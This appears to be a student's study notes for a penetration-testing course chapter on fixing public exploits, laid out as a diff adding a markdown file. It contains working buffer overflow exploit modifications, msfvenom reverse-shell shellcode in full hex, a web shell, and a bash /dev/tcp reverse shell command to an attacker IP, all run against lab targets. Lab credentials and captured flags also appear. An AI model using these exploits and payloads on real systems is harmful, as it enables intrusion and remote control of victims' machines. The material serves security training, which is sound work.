@@ -1,0 +1,749 @@
+---
+title: PEN-200 C. 13
+updated: 2023-09-18 01:08:44Z
+created: 2023-09-17 15:55:13Z
+latitude: 33.86223660
+longitude: -118.39951940
+altitude: 0.0000
+---
+
+# Fixing Exploits
+
+- Fixing Memory Corruption Exploits
+- Fixing Web Exploits
+
+## 13.1 Fixing Memory Corruption Exploits
+
+- Understand high-level buffer overflow theory
+- Cross-compile binaries
+- Modify and update memory corruption exploits
+
+### Buffer Overflow in a Nutshell
+
+- buffer
+	- a memory area intended to hold content, sent  by user, for later processing
+- Buffer Overflow
+	- One of the earliest mem corruption exploits
+		- circa late 1980s
+	- Still relevant today despite mitigation
+- Occurs when user provided content goes beyond the stack limit and over-runs into adjacent mem space.
+- Example;
+```
+| 8-byte buffer                 | Overflow by 2-bytes |
+| A | B | C | D | E | F | G | H | 0 | 1 |
+```
+- A buffer designed to contain and 8 byte buffer, for a password of 8 chars
+- If `password43` was sent, the buffer would overflow by 2 bytes `43`
+- If not handled correctly, buffer-overflow may be possible
+- *Although writing buffer overflow exploits is beyond the scope of the course, we're learning how they work so that we can understand when and how to adjust them whenever we encounter these attack vectors during an engagement.*
+
+This type of vuln can occur in `heap` or `stack`.
+- `heap`
+	- dynamically managed
+	- stores large chunks of global data
+- `stack`
+	- stores local function data
+	- size generally fixed
+	- often contains;
+		- local vars
+			- integers
+			- buffers
+- Example;
+```
+*buffer[64]*
+...
+strcpy(buffer, argv[1]);
+```
+- a 64 char buffer declared
+- user command line argument copied in via `strcpy`
+	- copies source string, second param
+	- to buffer, first param
+- This function is unsafe;
+	- it does not check the destination address to see if there is enough space to fit the source string.
+- The stack makes room for;
+	- exact buffer space, 64 bytes for 64 chars
+	- function params
+	- return address
+- If the user input is bigger than the dest buffer space, they can overwrite the return address
+	- When the function ends, it execs the ret address
+		- loading the ret address inside EIP/RIP (the *instruction pointer*)
+	- If you control the return address, you may be able to control program flow
+- *A typical buffer overflow attack scenario involves overwriting the return address with a JMP ESP instruction, which instructs the program to jump to the stack and execute the shellcode that has been injected right after the beginning of the payload.*
+
+**Mitigation**
+- ASLR
+- [Executable Space Protection](https://en.wikipedia.org/wiki/Executable_space_protection)
+
+**General Flow of Stack-Based Buffer Overflow**
+1. Create large buffer to trigger overflow
+2. Overwrite return address by padding buffer with appropriate offset, taking control of EIP
+3. Include chosen payload in buffer prepended by an optional NOP sled
+4. Choose correct return address instruction to redirect exec flow to payload, JMP ESP or appropriate register
+
+- As we fix the exploit for our use, we may need to modify elements
+	- file paths
+	- IPs
+	- ports
+	- URLs
+- If those modifications alter the offset, we must adjust buffer length
+	- ensuring we overwrite the ret address
+- It's always best to verify the return address ourselves
+	- clone the target env locally in a VM
+	- use a debugger to obtain the mem address of the return address instruction
+- We must also changes the payload contained in the OG Exploit
+	- There is inherent danger in running unknown hex encoded payloads
+	- Either decode and review or apply our own
+
+**Creating our own payloads**
+- We include our IP address, port, and exclude bad chars
+	- bad chars can be determined independently or gleaned from code
+- Bad Chars are ASCII or UNICODE chars that break the application when included in the payload
+	- may be interpreted as control chars
+		- null-byte `\x00` is often a string terminator, which could truncate the attack buffer
+
+Creating our own is advised when possible.  In some cases the attack relies on the payload itself, in this case we must reverse engineer the payload to see what it is doing and if it is safe to exec.
+
+### Importing and Examining the Exploit
+
+We find an exploit written in C for our enumerated application
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ searchsploit "Sync Breeze Enterprise 10.0.28"
+-------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                      |  Path
+-------------------------------------------------------------------- ---------------------------------
+Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC)            | windows/dos/43200.py
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow             | windows/remote/42928.py
+Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)       | windows/dos/42341.c
+-------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+- *Best to avoid DoS exploits when there are other options*
+- Focusing on the last two entries;
+	- Buffer overflow is triggered in HTTP server module on POST request
+- Important part of Python exploit;
+```
+offset    = "A" * 780 
+JMP_ESP   =  "\x83\x0c\x09\x10"
+shellcode = "\x90"*16 + msf_shellcode
+exploit   = offset + JMP_ESP + shellcode
+```
+- At offset 780
+	- overwrite instructions pointer with JMP ESP
+		- located at mem address `0x10090c83`
+			- `jmp = 10 09 0c 83 libspp.dll`
+	- Append our shellcode with 12 NOPs
+	- Exploit buffer included in POST request and sent
+
+Note that Python exploits require the Python interpreter be installed, whereas C can be compiled to run on the native platform.
+- *As an alternative, we could consider using PyInstaller, which packages Python applications into stand-alone executables for various target operating systems. However, given the nuances of exploit code, we suggest porting the code by hand*
+- Also, string concat in Python is the simple addition of two strings
+	- This is not allowed in C
+
+**Modify our exploit**
+- Mirror the selected exploit to our pwd with the searchsploit `-m` flag
+	- Inspect to determine what modification may be needed
+	- In this case, the headers imply it needs to be compiled on Win
+```
+#include <inttypes.h>
+#include <stdio.h>
+#include <winsock2.h>
+#include <windows.h>
+```
+- We ca cross compile this on Kali
+
+
+### Cross-Compiling Exploit Code
+
+Using native compilers is not always an option, in such cases we can cross compile for the target platform.  We will use the `mingw-w64` cross compiler for this purpose.
+- We can use ming-w64 to compile a Windows PE
+- First, determine if the code compiles without errors
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0xfc): undefined reference to `_imp__WSAGetLastError@0'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x146): undefined reference to `_imp__htons@4'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x16f): undefined reference to `_imp__connect@12'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x1b8): undefined reference to `_imp__send@16'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccnpT4bb.o:42341.c:(.text+0x1eb): undefined reference to `_imp__closesocket@4'
+collect2: error: ld returned 1 exit status
+```
+- No joy, start looking at errors from top down
+	- Google shows `WSAStartup` is a function found in `winsock.h`
+		- It needs the winsock lib `lws2_32`
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+- We see it now compiles without error
+	- The `-l` option instructs compiler to include `ws2_32` DLL in the executable via static linking.
+
+Now that we can compile the exploit, we edit the params for our attack.
+- Inspecting the C code shows hard-coded values for IP and Port
+```
+printf("[>] Socket created.\n");
+server.sin_addr.s_addr = inet_addr("10.11.0.22");
+server.sin_family = AF_INET;
+server.sin_port = htons(80);
+```
+- After editing and recompiling we test
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ wine syncbreeze_exploit.exe     
+
+[>] Initialising Winsock...
+[>] Initialised.
+[>] Socket created.
+```
+- We can see in Wireshark that the socket connection has been created
+
+
+### Fixing the Exploit
+
+- Inspecting our exploit, we see a return address listed in Visual Basic 6.0 runtime `msvbvm60.dll`
+	- This is not part of our vulnerable software
+	- We can see this by examining loaded modules in the debugger of the Windows client
+
+**To Verify**
+- Start the Sync Breeze Service on our sandbox VM
+- **Launch Immunity Debugger as Administrator**
+	- File
+	- Attach
+		- select `syncbrs` process
+- Once attached, click View
+	- Executable Modules
+		- From here, we can verify that nsvbvm60.dll is not present through the "name and Path" values
+
+Considering the Python exploit is marked "Verified", we know it is tested as working.  We can use the return address from that exploit in our C exploit.
+- OG C exploit ret
+```
+    unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
+```
+- Python exploit ret
+```
+# jmp = 10 09 0c 83 libspp.dll
+...
+crash = "A" * 780 + "\x83\x0c\x09\x10" + "\x90"*16 + buf
+```
+- Note the hex encoding of the ret `"\x83\x0c\x09\x10"` from the Python Exploit
+	- In this case, we have a good ret addr available, if this is not the case;
+		- Best option is to recreate target env in VM
+			- Use debugger to determine addr
+		- We could also use info from other public exploits to find a reliable ret addr
+			- Example; If we need a ret addr for a JMP ESP instruction on Win Server 2019
+				- We can search for exploits leveraging different vulns in the target system
+				- This is less reliable
+
+In a Vanilla Buffer-Overflow;
+- do not rely on hard-coded JMP ESP addr coming from sys DLLs
+	- they are randomized at boot time by ASLR
+- Try to find those instructions in non-ASLR modules of the vulnerable app
+
+If we have user access to the target and want to run a privesc exploit;
+- we can copy the interesting DLLs from target to attacker
+	- leverage tools such as disassemblers
+		- objdump
+
+Continuing out exploit analysis;
+- `shellcode` var holds the payload
+	- hex encoded, cannot easily determine purpose
+- Since the Python exploit tells us the bad chars, we can generate a payload with msfvenom
+	- target platform x86
+	- format for C code
+	- *Had to run twice, error on first run*
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D\x25\x26\x2B\x3D"
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1506 bytes
+unsigned char buf[] = 
+"\xbf\xd6\xe8\x2f\xbb\xdb\xd9\xd9\x74\x24\xf4\x5b\x33\xc9"
+"\xb1\x52\x83\xc3\x04\x31\x7b\x0e\x03\xad\xe6\xcd\x4e\xad"
+"\x1f\x93\xb1\x4d\xe0\xf4\x38\xa8\xd1\x34\x5e\xb9\x42\x85"
+"\x14\xef\x6e\x6e\x78\x1b\xe4\x02\x55\x2c\x4d\xa8\x83\x03"
+"\x4e\x81\xf0\x02\xcc\xd8\x24\xe4\xed\x12\x39\xe5\x2a\x4e"
+"\xb0\xb7\xe3\x04\x67\x27\x87\x51\xb4\xcc\xdb\x74\xbc\x31"
+"\xab\x77\xed\xe4\xa7\x21\x2d\x07\x6b\x5a\x64\x1f\x68\x67"
+"\x3e\x94\x5a\x13\xc1\x7c\x93\xdc\x6e\x41\x1b\x2f\x6e\x86"
+"\x9c\xd0\x05\xfe\xde\x6d\x1e\xc5\x9d\xa9\xab\xdd\x06\x39"
+"\x0b\x39\xb6\xee\xca\xca\xb4\x5b\x98\x94\xd8\x5a\x4d\xaf"
+"\xe5\xd7\x70\x7f\x6c\xa3\x56\x5b\x34\x77\xf6\xfa\x90\xd6"
+"\x07\x1c\x7b\x86\xad\x57\x96\xd3\xdf\x3a\xff\x10\xd2\xc4"
+"\xff\x3e\x65\xb7\xcd\xe1\xdd\x5f\x7e\x69\xf8\x98\x81\x40"
+"\xbc\x36\x7c\x6b\xbd\x1f\xbb\x3f\xed\x37\x6a\x40\x66\xc7"
+"\x93\x95\x29\x97\x3b\x46\x8a\x47\xfc\x36\x62\x8d\xf3\x69"
+"\x92\xae\xd9\x01\x39\x55\x8a\xed\x16\x78\xa5\x86\x64\x82"
+"\x38\xec\xe0\x64\x50\x02\xa5\x3f\xcd\xbb\xec\xcb\x6c\x43"
+"\x3b\xb6\xaf\xcf\xc8\x47\x61\x38\xa4\x5b\x16\xc8\xf3\x01"
+"\xb1\xd7\x29\x2d\x5d\x45\xb6\xad\x28\x76\x61\xfa\x7d\x48"
+"\x78\x6e\x90\xf3\xd2\x8c\x69\x65\x1c\x14\xb6\x56\xa3\x95"
+"\x3b\xe2\x87\x85\x85\xeb\x83\xf1\x59\xba\x5d\xaf\x1f\x14"
+"\x2c\x19\xf6\xcb\xe6\xcd\x8f\x27\x39\x8b\x8f\x6d\xcf\x73"
+"\x21\xd8\x96\x8c\x8e\x8c\x1e\xf5\xf2\x2c\xe0\x2c\xb7\x4d"
+"\x03\xe4\xc2\xe5\x9a\x6d\x6f\x68\x1d\x58\xac\x95\x9e\x68"
+"\x4d\x62\xbe\x19\x48\x2e\x78\xf2\x20\x3f\xed\xf4\x97\x40"
+"\x24";
+```
+- Edit the payload in after the NOPs
+- compile the edited version
+
+**To Test**
+- Return to Immunity Debugger
+	- With syncbreeze process attached, Ctrl+G
+	- Follow JMP ESP addr at 0x10090c83
+	- press F2 to set a breakpoint
+	- allow the application to run normally
+- Run our modified exploit with wine and see if we hit our breakpoint
+	- we do not!
+![0fd20347cb5654d66ec80eae9dd30365.png](../_resources/0fd20347cb5654d66ec80eae9dd30365.png)
+- Analyze the value stored in the EIP and the buffer we sent
+	- EIP `0x9010090c`
+	- Buffer `0x10090c83`
+- We are off by 1 byte!!!
+	- To exec shellcode on the stack, we need ret to point at JMP ESP
+
+### Changing the Overflow Buffer
+
+We know that we have an offset misalignment.  Our padding buffer is all "A" chars, the call to `malloc` with size `780` creates it.
+```
+int initial_buffer_size = 780;
+char *padding = malloc(initial_buffer_size);
+```
+- Previously we established 780 as the byte offset required to overwrite the ret addr and take control of the EIP reg
+- `malloc` only allocates a block of mem
+- the buffer must be initialized with `memset`, called after `malloc`
+```
+memset(padding, 0x41, initial_buffer_size);
+```
+- This fills the memory allocated with a char
+	- `0x41`, hex for `A`
+- On the next line, a call to `memset` sets the last byte to a NULL byte
+```
+memset(padding + initial_buffer_size - 1, 0x00, 1);
+```
+- Here, the final buffer is created
+```
+char *buffer = malloc(buffer_length);
+memset(buffer, 0x00, buffer_length);
+strcpy(buffer, request_one);
+strcat(buffer, content_length_string);
+strcat(buffer, request_two);
+strcat(buffer, padding);
+strcat(buffer, retn);
+strcat(buffer, shellcode);
+strcat(buffer, request_three);
+```
+- a memory block is allocated for the buffer with `malloc`
+	- it gets filled with NULL bytes
+- next, the buffer is filled by copying contents of the other vars with `strcpy` and `strcat`
+- Knowing that the final buffer must be a string is important
+	- In C there are NULL-terminated strings
+	- The aforementioned functions determine the end/size of a string by searching for the first NULL byte occurrence
+- Our initial buffer of 780, with last byte set to `0x00` , our concat results in a string of ASCII `A` that is 779 bytes in len
+	- this explains the misalignment
+- **To fix;** increase the requested size of `inital_buffer_size` variable by 1
+```
+    int initial_buffer_size = 781;
+    char *padding = malloc(initial_buffer_size);
+    memset(padding, 0x41, initial_buffer_size);
+    memset(padding + initial_buffer_size - 1, 0x00, 1);
+```
+- This time, when we set our breakpoint and run the exploit
+	- We hit the breakpoint with the correct ret addr
+	- Hit F9 to continue and we get a rev shell to our listener!
+
+
+## 13.2 Fixing Web Exploits
+
+- Fix web application exploits
+- Troubleshoot common web application exploit issues
+
+### Considerations and Overview
+
+- Key questions when modding web exploits;
+- Does it initiate an HTTP or HTTPS connection?
+- Does it access a specific web application path or route?
+- Does the exploit leverage a pre-authentication vulnerability?
+- If not, how does the exploit authenticate to the web application?
+- How are the GET or POST requests crafted to trigger and exploit the vulnerability? Is there any HTTP method involved?
+- Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
+- Will oddities such as self-signed certificates disrupt the exploit?
+*Be aware of measures such as ".htaccess" and WAF*
+
+### Selecting the Vulnerability and Fixing the Code
+
+Example;
+- Enumerating a web server we find "CMS Made Simple 2.2.5" on port 443
+- It is vulnerable to RCE and there is an exploit on EDB
+	- Post auth, but in this example we found creds on another system
+- We inspect the code, `base_url` var must be modified
+```
+base_url = "http://192.168.1.10/cmsms/admin"
+```
+- We change this to reflect our target
+```
+base_url = "https://192.168.50.120/admin"
+```
+- We also notice a self signed cert while browsing the target
+	- We need to account for this in the exploit code
+- The exploit uses `requests` Python lib
+```
+...
+    response  = requests.post(url, data=data, allow_redirects=False)
+...
+    response = requests.post(url, data=data, files=txt, cookies=cookies)
+...
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
+...
+```
+- The docs indicate SSL cert will be ignored if we set `verify` to `False`
+```
+...
+    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
+...
+    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
+...
+    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
+...
+```
+- Finally, we need to update our creds with valid set we discovered earlier
+- In this case, we don't need to update the payload
+	- Simple web-shell, we know what it is doing
+
+We run the exploit and receive an error;
+```
+  File "44976_modified.py", line 24, in parse_csrf_token
+    return location.split(csrf_param + "=")[1]
+IndexError: list index out of range
+```
+- standard Python debugging tactics apply
+
+
+### Troubleshooting the "index out of range" Error
+
+We have an error on line 24 of our modified exploit.  This happens during a call to split.  In our code we see the string separator is `csf_param` defined as `_c`, an `=` is appended to it when called.
+As we would with any error of this sort in Python, we will add a print statement to see what the `location` variable actually is;
+```
+[+] Authenticated successfully with the supplied credentials
+https://192.168.219.45/admin?_sk_=6fee98309057bb04eb0
+```
+- We can see that `csf_param` must be changed to `_sk_`
+	- We may not know why this is, there are many possible reasons, but we can test it out
+- We modify the param as needed
+- Run the exploit again
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ python2 44976.py
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+/usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.219.45'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+[+] Authenticated successfully with the supplied credentials
+https://192.168.219.45/admin?_sk_=059197ae938f7decd08
+[*] Attempting to upload cmsmsrce.txt...
+/usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.219.45'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+[+] Successfully uploaded cmsmsrce.txt
+[*] Attempting to copy cmsmsrce.txt to shell.php...
+/usr/share/offsec-awae-wheels/urllib3-1.25.9-py2.py3-none-any.whl/urllib3/connectionpool.py:986: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.219.45'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+[+] File copied successfully
+[+] Exploit succeeded, shell can be found at: https://192.168.219.45/uploads/shell.php
+```
+- Success!
+- Validate by testing the web-shell;
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ curl -k https://192.168.219.45/uploads/shell.php?cmd=whoami
+www-data
+```
+- Note `-k` to handle the self signed cert!
+
+
+
+
+
+#### Exercises and Capstone
+
+Capstone Exercise: To put in practice what we learned so far, here is the full vulnerable CMS Made Simple. You recovered the credentials for the admin on this service who is the user offsec with the password lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ. Use this information to exploit the service on VM 1 that is running on http://IP_ADDRESS/cmsms and read /home/flag.txt to solve this challenge.
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ python2 44976.py
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+[+] Authenticated successfully with the supplied credentials
+http://192.168.219.52/cmsms/admin?_sk_=5e1b07669707ee8d081
+[*] Attempting to upload cmsmsrce.txt...
+[+] Successfully uploaded cmsmsrce.txt
+[*] Attempting to copy cmsmsrce.txt to shell.php...
+[+] File copied successfully
+[+] Exploit succeeded, shell can be found at: http://192.168.219.52/cmsms/uploads/shell.php
+
+
+# Web Shell
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ curl http://192.168.219.52/cmsms/uploads/shell.php?cmd=whoami   
+www-data
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ curl http://192.168.219.52/cmsms/uploads/shell.php?cmd=which%20bash             
+/bin/bash
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ curl http://192.168.219.52/cmsms/uploads/shell.php?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.239%2F4444%200%3E%261%22
+
+
+# Attacking machine
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.239] from (UNKNOWN) [192.168.219.52] 36884
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@eeaf22c3394e:/var/www/html/cmsms/uploads$ cat /home/flag.txt
+cat /home/flag.txt
+OS{a8a695c95e5c9677600ff6cb7c7aaedc}
+
+```
+
+Capstone Exercise: The next VM, Module Exercise VM 2, is running a vulnerable version of the elFinder web application whose exploit is available . Once you've found the application base address through directory brute-forcing, modify the exploit to point to the correct application URL and get a shell. The flag can be found in the same folder. Note: Before running the exploit, remember to place a valid JPEG file on your local Kali machine and name it according to the exploit specifications.
+```
+# A scan with dirb and dirb's cgi wordlist didn't turn much up
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ dirb http://192.168.219.46/
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ dirb http://192.168.219.46/ /usr/share/wordlists/dirb/vulns/cgis.txt 
+
+
+# Try with dirbuster wordlists /usr/share/wordlists/dirbuster/
+
+
+# While running dirb, looked at gobuster.  gobuster appears to be much faster and a better option for directory brute forcing in this case.
+# Gobuster ran a larger wordlist and found the dir while dirb was still running!
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ gobuster dir -u http://192.168.219.46 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.219.46
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/seclab               (Status: 301) [Size: 317] [--> http://192.168.219.46/seclab/]
+...
+
+
+# Knowing that the target is elFinder, and the app dir is `seclab`, we are able to use EDB 46481 to exploit the target.
+# We only needed to copy a valid JPG into the pwd as SecSignal.jpg 
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ python2 46481.py http://192.168.219.46/seclab/
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+[*] Uploading the malicious image...
+[*] Running the payload...
+[+] Pwned! :)
+[+] Getting the shell...
+$ whoami
+www-data
+
+$ ls
+MySQLStorage.sql
+SecSignal.php
+autoload.php
+connector.minimal.php
+editors
+elFinder.class.php
+elFinderConnector.class.php
+elFinderFlysystemGoogleDriveNetmount.php
+elFinderPlugin.php
+elFinderSession.php
+elFinderSessionInterface.php
+elFinderVolumeBox.class.php
+elFinderVolumeDriver.class.php
+elFinderVolumeDropbox.class.php
+elFinderVolumeDropbox2.class.php
+elFinderVolumeFTP.class.php
+elFinderVolumeGoogleDrive.class.php
+elFinderVolumeGroup.class.php
+elFinderVolumeLocalFileSystem.class.php
+elFinderVolumeMySQL.class.php
+elFinderVolumeOneDrive.class.php
+elFinderVolumeTrash.class.php
+elFinderVolumeTrashMySQL.class.php
+flag.txt
+libs
+mime.types
+plugins
+resources
+
+$ cat flag.txt
+OS{2a71a3d83ccd380337b1d78c87fd9f24}
+```
+
+
+
+
+```bash
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ sudo nmap -sS -v -p 1-65355 192.168.219.213
+
+...
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub
+20000/tcp open  dnp
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+...
+
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ sudo nmap -sS -sV -v -p 135,139,445,5040,7680,20000 192.168.219.213
+
+...
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+20000/tcp open  http          Easy Chat Server httpd 1.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+...
+
+
+# Easy Chat Server
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ searchsploit "Easy Chat Server"
+-------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                      |  Path
+-------------------------------------------------------------------- ---------------------------------
+Easy Chat Server 1.x - Multiple Denial of Service Vulnerabilities   | multiple/dos/24247.txt
+Easy Chat Server 3.1 - 'message' Denial of Service (PoC)            | windows/dos/46806.py
+Easy Chat Server 3.1 - 'message' Denial of Service (PoC)            | windows/dos/46806.py
+Easy Chat Server 3.1 - Directory Traversal and Arbitrary File Read  | windows/webapps/50437.txt
+Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)           | windows/remote/50999.py
+EFS Easy Chat Server - Authentication Request Handling Buffer Overf | windows/remote/16772.rb
+EFS Easy Chat Server - Universal Buffer Overflow (SEH) (Metasploit) | windows/remote/11210.rb
+EFS Easy Chat Server 2.2 - Authentication Request Buffer Overflow   | windows/remote/8154.pl
+EFS Easy Chat Server 2.2 - Authentication Request Buffer Overflow ( | windows/remote/8142.py
+EFS Easy Chat Server 2.2 - Cross-Site Request Forgery (Change Admin | windows/remote/8149.txt
+EFS Easy Chat Server 2.2 - Remote Denial of Service                 | windows/dos/4289.php
+EFS Easy Chat Server 3.1 - Password Disclosure                      | windows/webapps/42153.py
+EFS Easy Chat Server 3.1 - Password Reset                           | windows/webapps/42154.py
+EFS Easy Chat Server 3.1 - Remote Buffer Overflow (SEH)             | windows/remote/42155.py
+EFS Easy Chat Server 3.1 - Remote Stack Buffer Overflow             | windows/remote/33326.py
+EFS Software Easy Chat Server 2.2 - Remote Buffer Overflow          | windows/remote/11179.rb
+-------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+### IMPORTANT, YOU PROBABLY WANT A STAGELESS PAYLOAD!!!
+# Use msfvenom --list payloads to find reverse_tcp shell
+
+┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/fixing-exploits]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=1990 EXITFUNC=seh -f python -b "\x00\x20" -v shellcode -e x86/shikata_ga_nai
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1965 bytes
+shellcode =  b""
+shellcode += b"\xda\xdc\xd9\x74\x24\xf4\x5d\x2b\xc9\xba\x54"
+shellcode += b"\x46\x5c\xfa\xb1\x52\x31\x55\x17\x83\xc5\x04"
+shellcode += b"\x03\x01\x55\xbe\x0f\x55\xb1\xbc\xf0\xa5\x42"
+shellcode += b"\xa1\x79\x40\x73\xe1\x1e\x01\x24\xd1\x55\x47"
+shellcode += b"\xc9\x9a\x38\x73\x5a\xee\x94\x74\xeb\x45\xc3"
+shellcode += b"\xbb\xec\xf6\x37\xda\x6e\x05\x64\x3c\x4e\xc6"
+shellcode += b"\x79\x3d\x97\x3b\x73\x6f\x40\x37\x26\x9f\xe5"
+shellcode += b"\x0d\xfb\x14\xb5\x80\x7b\xc9\x0e\xa2\xaa\x5c"
+shellcode += b"\x04\xfd\x6c\x5f\xc9\x75\x25\x47\x0e\xb3\xff"
+shellcode += b"\xfc\xe4\x4f\xfe\xd4\x34\xaf\xad\x19\xf9\x42"
+shellcode += b"\xaf\x5e\x3e\xbd\xda\x96\x3c\x40\xdd\x6d\x3e"
